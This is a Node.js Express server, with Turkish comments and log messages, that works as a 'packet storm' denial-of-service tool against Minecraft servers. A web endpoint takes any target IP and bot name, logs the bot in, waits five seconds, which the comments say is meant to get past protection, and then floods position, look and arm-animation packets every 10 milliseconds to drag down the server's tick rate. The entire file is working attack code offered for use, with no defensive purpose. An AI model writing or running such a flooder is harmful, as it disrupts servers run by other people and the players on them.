const express = require('express');
const mc = require('minecraft-protocol');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 10000;

app.use(cors());

let client = null;
let stormInterval = null;

app.get('/bot-gonder', (req, res) => {
    const { ip, isim } = req.query;
    if (client) { client.end(); clearInterval(stormInterval); }

    console.log(`[PAKET FIRTINASI] Hedef: ${ip} | Operatör: ${isim}`);

    client = mc.createClient({
        host: ip,
        port: 25565,
        username: isim,
        version: "1.20.1",
        noDelay: true // Paketlerin birleşmesini engeller, her birini ayrı mermi gibi atar
    });

    client.on('success', () => {
        console.log("!!! SIZMA BASARILI: PAKETLER HAZIRLANAMIYOR !!!");
        
        // 5 saniye sonra saldırıyı başlat (Korumayı geçmek için bekleme süresi)
        setTimeout(() => {
            stormInterval = setInterval(() => {
                if(!client) return;

                // 1. Hareket Paketi (Sunucunun fizik motorunu yorar)
                client.write('position', {
                    x: Math.random(), y: 64, z: Math.random(),
                    onGround: false
                });

                // 2. Bakış Paketi (Eksentrik hesaplama yaptırır)
                client.write('look', {
                    yaw: Math.random() * 360,
                    pitch: Math.random() * 180,
                    onGround: false
                });

                // 3. Kol Sallama / Animasyon Paketi (Görsel işlem yükü)
                client.write('arm_animation', { hand: 0 });

            }, 10); // HER 10 MİLİSANİYEDE BİR (Saniyede 100 paket!)
        }, 5000);
    });

    client.on('error', (err) => console.log("HATA:", err.message));
    res.send("Fırtına başlatıldı. TPS'yi izle!");
});

app.listen(port, '0.0.0.0', () => console.log(`Packet Engine 10k Ready.`));
